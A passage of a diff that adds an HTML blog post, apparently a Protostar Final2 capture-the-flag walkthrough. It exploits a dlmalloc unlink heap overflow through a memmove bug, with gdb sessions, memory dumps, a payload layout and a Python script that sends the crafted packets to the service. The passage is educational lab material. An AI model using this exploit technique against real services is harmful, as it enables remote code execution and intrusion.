+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">pagination</span> <span class="n">off</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Disassemble <code>get_requests()</code> to find where <code>check_path()</code> returns.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disassemble</span> <span class="n">get_requests</span>
+</span><span class='line'><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">get_requests</span><span class="p">:</span>
+</span><span class='line'><span class="mh">0x0804bd47</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">push</span>   <span class="n">ebp</span>
+</span><span class='line'><span class="mh">0x0804bd48</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+</span><span class='line'><span class="o">...</span>
+</span><span class='line'><span class="mh">0x0804bdce</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">135</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
+</span><span class='line'><span class="mh">0x0804bdd1</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">138</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">call</span>   <span class="mh">0x804bcd0</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">&gt;</span>
+</span><span class='line'><span class="mh">0x0804bdd6</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">143</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">jmp</span>    <span class="mh">0x804bd57</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span>
+</span><span class='line'><span class="mh">0x0804bddb</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">148</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">nop</span>
+</span><span class='line'><span class="o">...</span>
+</span><span class='line'><span class="mh">0x0804be25</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">222</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">ret</span>
+</span><span class='line'><span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="o">.</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">143</span>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x804bdd6</span><span class="p">:</span> <span class="nb">file</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span><span class="p">,</span> <span class="n">line</span> <span class="mf">51.</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span><span class='line'><span class="n">Continuing</span><span class="o">.</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now run our Python script in another terminal to send the strings.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">python</span> <span class="n">test</span><span class="o">.</span><span class="n">py</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">99.107</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Our gdb terminal will show the following.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">[</span><span class="n">New</span> <span class="n">process</span> <span class="mi">2322</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="n">Switching</span> <span class="n">to</span> <span class="n">process</span> <span class="mi">2322</span><span class="p">]</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="n">get_requests</span> <span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span> <span class="n">at</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">51</span>
+</span><span class='line'><span class="mi">51</span>    <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="nb">file</span> <span class="ow">or</span> <span class="n">directory</span><span class="o">.</span>
+</span><span class='line'>  <span class="ow">in</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span>
+</span><span class='line'><span class="n">Current</span> <span class="n">language</span><span class="p">:</span>  <span class="n">auto</span>
+</span><span class='line'><span class="n">The</span> <span class="n">current</span> <span class="n">source</span> <span class="n">language</span> <span class="ow">is</span> <span class="s">&quot;auto; currently c&quot;</span><span class="o">.</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Print <code>buf</code> to show the address it points to. Then examine the first 40 DWORDs in hexadecimal
+starting at address <code>0x804e000</code> (<code>0x804e008 - 0x8</code> so we can see the first heap chunk&rsquo;s metadata in
+the previous 8 bytes). We can see its <code>FSRD</code> (<code>0x44525346</code>) followed by lots of <code>A</code>s (<code>0x41</code>s) and
+ends in <code>/AAAA</code>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span> <span class="n">buf</span>
+</span><span class='line'><span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="mh">0x804e008</span> <span class="s">&quot;FSRD&quot;</span><span class="p">,</span> <span class="s">&#39;A&#39;</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">119</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">,</span> <span class="s">&quot;/AAAA&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">40</span><span class="n">wx</span> <span class="mh">0x804e000</span>
+</span><span class='line'><span class="mh">0x804e000</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000089</span>  <span class="mh">0x44525346</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e010</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e020</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e030</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e040</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e050</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e060</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e070</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e080</span><span class="p">:</span> <span class="mh">0x2f414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f79</span>
+</span><span class='line'><span class="mh">0x804e090</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We continue and examine the memory of the first chunk again. We expect the memory at address
+<code>0x804e084</code> to be <code>BBBB</code> or <code>0x42424242</code> which it is.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span><span class='line'><span class="n">Continuing</span><span class="o">.</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="n">get_requests</span> <span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span> <span class="n">at</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">51</span>
+</span><span class='line'><span class="mi">51</span>    <span class="ow">in</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">40</span><span class="n">wx</span> <span class="mh">0x804e000</span>
+</span><span class='line'><span class="mh">0x804e000</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000089</span>  <span class="mh">0x44525346</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e010</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e020</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e030</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e040</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e050</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e060</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e070</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e080</span><span class="p">:</span> <span class="mh">0x2f414141</span>  <span class="mh">0x42424242</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000089</span>
+</span><span class='line'><span class="mh">0x804e090</span><span class="p">:</span> <span class="mh">0x44525346</span>  <span class="mh">0x544f4f52</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Exploiting <code>free()</code></h2>
+
+<p>With the ability to overwrite bytes following a strategically placed <code>/</code> character in the previous
+heap chunk, we can perform a classic heap overflow exploit using the <code>unlink()</code> technique. We can&rsquo;t
+overwrite the first chunk&rsquo;s heap metadata because there&rsquo;s no way to insert a <code>/</code> before it. So we
+target the second chunk&rsquo;s heap metadata. I&rsquo;m now going to rehash some of the dlmalloc algorithm
+explained in my <a href="https://www.davidxia.com/2020/04/how-to-exploit-dlmalloc-unlink/?asdf">previous post</a> because it can be a little confusing.</p>
+
+<p>When the first chunk is freed, <code>unlink()</code> will run on the second chunk if the second chunk has
+already been freed. dlmalloc determines if the second chunk is freed by checking the third chunk&rsquo;s
+<code>PREV_INUSE</code> bit which is the lowest bit of the second byte of the chunk. In order to find the start
+of the third chunk, dlmalloc adds the value of the chunk&rsquo;s second DWORD bitmasked with 0x1 (i.e.
+ignoring the lowest bit) to the chunk&rsquo;s starting address. So in the above memory dump, the
+start of the second chunk is <code>0x00000089 &amp;0x1 + 0x804e000 = 0x804e088</code>. Likewise, the start of the
+third chunk is <code>0x00000089 &amp;0x1 + 0x804e088 = 0x804e110</code>. So we have to figure out a way to write
+arbitrary bytes to the third chunk.</p>
+
+<p>But we&rsquo;re already writing arbitrary bytes to the second chunk&rsquo;s metadata. Is there way to make
+dlmalloc think the third chunk starts somewhere in memory where we&rsquo;re already writing bytes for the
+second chunk? Nothing in dlmalloc checks the third chunk is actually right after the second.
+dlmalloc just blindly performs an addition on two numbers. One of these numbers is the second
+chunk&rsquo;s size which we can set via the <code>memmove()</code> bug. Let&rsquo;s make dlmalloc think the third chunk is
+actually four bytes before the start of the second chunk. The second chunk is at <code>0x804e088</code> so the
+&ldquo;virtual&rdquo; third chunk will be at <code>0x804e084</code>. What number added to <code>0x804e088</code> equals <code>0x804e084</code>?
+-4. [Integer overflow] means adding <code>0xfffffffc</code> is the same as adding -4 (<code>0x804e088 + 0xfffffffc =
+0x804e084</code>). So the second chunk&rsquo;s second DWORD representing its size must be <code>0xfffffffc</code>, and the
+<code>PREV_INUSE</code> bit of the third chunk must be 0. <code>0xfffffffc 0xfffffffc</code> will work.</p>
+
+<p>Once we fool dlmalloc into thinking the second chunk is already freed, dlmalloc will <code>unlink()</code> it.
+So we need to craft values for the second chunk&rsquo;s forwards and backwards pointers such that
+<code>unlink()</code> will redirect code execution to another region of memory where we can insert shellcode.</p>
+
+<p>In the Heap3 level we overwrote the address of a function in the procedure linkage table (PLT) with
+the address of shellcode. We can do the same here. Since we send two packets, <code>dll</code> will be 2. The
+for-loop will call <code>write()</code> twice. The first <code>free()</code> will overwrite <code>write()</code>&rsquo;s address in the
+PLT. Let&rsquo;s find the PLT address containing the address of <code>write()</code>. We <code>disassemble get_requests</code>,
+examine the address <code>0x8048dfc</code> as an instruction to get the address in the global offset table
+(GOT) that points to the dynamically linked library containing the actual <code>write()0</code> function. We
+want to overwrite the contents of <code>0x804d41c</code> with the address of our shellcode. Since <code>unlink()</code>
+adds 12 to the forwards pointer, we need to make the forward pointer <code>0x804d41c - 12</code>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">disassemble</span> <span class="n">get_requests</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">get_requests</span><span class="p">:</span>
+</span><span class='line'><span class="o">...</span>
+</span><span class='line'><span class="mh">0x0804be01</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">186</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">call</span>   <span class="mh">0x8048dfc</span> <span class="o">&lt;</span><span class="n">write</span><span class="nd">@plt</span><span class="o">&gt;</span>
+</span><span class='line'><span class="o">...</span>
+</span><span class='line'><span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="o">.</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="mh">0x8048dfc</span>
+</span><span class='line'><span class="mh">0x8048dfc</span> <span class="o">&lt;</span><span class="n">write</span><span class="nd">@plt</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">jmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">ds</span><span class="p">:</span><span class="mh">0x804d41c</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">x</span> <span class="mh">0x804d41c</span>
+</span><span class='line'><span class="mh">0x804d41c</span> <span class="o">&lt;</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;</span><span class="p">:</span>    <span class="mh">0xb7f53c70</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Crafting Malicious Packets</h2>
+
+<p>Where should we put our shellcode? We can include it in our first request. The first two DWORDs will
+be clobbered by dlmalloc when it sets the first chunk&rsquo;s forwards and backwards pointers. The first
+word needs to be used for <code>FSRD</code> anyways. So let&rsquo;s put shellcode at <code>0x804e010</code>. This address will
+be our backwards pointer.</p>
+
+<p>To summarize, this is how the packets should look so far.</p>
+
+<p>The first payload must start with <code>FSRD</code>. Then we need four bytes of filler bytes <code>AAAA</code> followed by
+shellcode (TBD). The last byte must be <code>/</code> for <code>memmove()</code>. The payload must be 128 bytes. The
+spaces in the payload visualization below are just for readability. They shouldn&rsquo;t be in the actual
+payload.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">FSRD</span> <span class="n">AAAA</span> <span class="o">&lt;</span><span class="n">shellcode</span><span class="o">&gt;</span> <span class="n">AAAA</span> <span class="o">...</span> <span class="n">AAA</span><span class="o">/</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The second payload must start with <code>FSRDROOT</code>. Then have <code>0xfffffffc 0xfffffffc</code>. Then the forward
+pointer <code>0x804d41c - 12</code> and backward pointer <code>0x804e010</code>. The whole payload must again be 128
+bytes. We can just fill with <code>A</code>s.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">FSRD</span> <span class="n">ROOT</span> <span class="mh">0xfffffffc</span> <span class="mh">0xfffffffc</span> <span class="mh">0x804d41c</span> <span class="o">-</span> <span class="mi">12</span> <span class="mh">0x804e010</span> <span class="n">AAAA</span> <span class="o">...</span> <span class="n">AAAA</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Before we craft shellcode, let&rsquo;s confirm the exploit will redirect code execution to the proposed
+shellcode address. Instead of using actual shellcode, we&rsquo;ll use four bytes of <code>0xcc</code> which is a
+one-byte x86 instruction called <a href="https://en.wikipedia.org/wiki/INT_(x86_instruction)"><code>INT3</code></a> that causes the processor to halt the process for any
+attached debuggers. If we hit this opcode, our attached gdb debugger receive the <code>SIGTRAP</code> signal.
+Let&rsquo;s test with the below Python script.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="n">REQSZ</span> <span class="o">=</span> <span class="mi">128</span>
+</span><span class='line'><span class="n">HOST</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span><span class='line'><span class="n">PORT</span> <span class="o">=</span> <span class="mi">2993</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\xcc\xcc\xcc\xcc</span><span class="s">&#39;</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="n">ba</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="s">&#39;FSRDAAAA&#39;</span><span class="p">,</span> <span class="s">&#39;ascii&#39;</span><span class="p">))</span>
+</span><span class='line'><span class="n">ba</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span><span class='line'><span class="n">ba</span> <span class="o">=</span> <span class="n">ba</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x41</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">ba</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&#39;/&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">ba</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">ba</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="s">&#39;FSRDROOT/&#39;</span><span class="p">,</span> <span class="s">&#39;ascii&#39;</span><span class="p">))</span>
+</span><span class='line'><span class="c"># Use integer overflow to make dlmalloc think third chunk is 4 bytes before second chunk.</span>
+</span><span class='line'><span class="n">ba</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0xfffffffc</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0xfffffffc</span><span class="p">))</span>
+</span><span class='line'><span class="c"># Add forward and backward pointers</span>
+</span><span class='line'><span class="n">ba</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0x804d41c</span> <span class="o">-</span> <span class="mi">12</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0x804e010</span><span class="p">))</span>
+</span><span class='line'><span class="n">ba</span> <span class="o">=</span> <span class="n">ba</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x41</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">ba</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
+</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
+</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Attach gdb to the <code>final2</code> process again.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ssh</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;UserKnownHostsFile=/dev/null&quot;</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;StrictHostKeyChecking=no&quot;</span> <span class="n">root</span><span class="nd">@192.168.99.107</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">root</span><span class="nd">@protostar</span><span class="p">:</span><span class="o">/</span><span class="c"># gdb /opt/protostar/bin/final2 -p 1495</span>
+</span><span class='line'><span class="o">...</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">follow</span><span class="o">-</span><span class="n">fork</span><span class="o">-</span><span class="n">mode</span> <span class="n">child</span>
+</span><span class='line'><span class="n">Current</span> <span class="n">language</span><span class="p">:</span>  <span class="n">auto</span>
+</span><span class='line'><span class="n">The</span> <span class="n">current</span> <span class="n">source</span> <span class="n">language</span> <span class="ow">is</span> <span class="s">&quot;auto; currently asm&quot;</span><span class="o">.</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">detach</span><span class="o">-</span><span class="n">on</span><span class="o">-</span><span class="n">fork</span> <span class="n">off</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">disassembly</span><span class="o">-</span><span class="n">flavor</span> <span class="n">intel</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">pagination</span> <span class="n">off</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Set a breakpoint at the call to <code>write()</code>.</p>
+
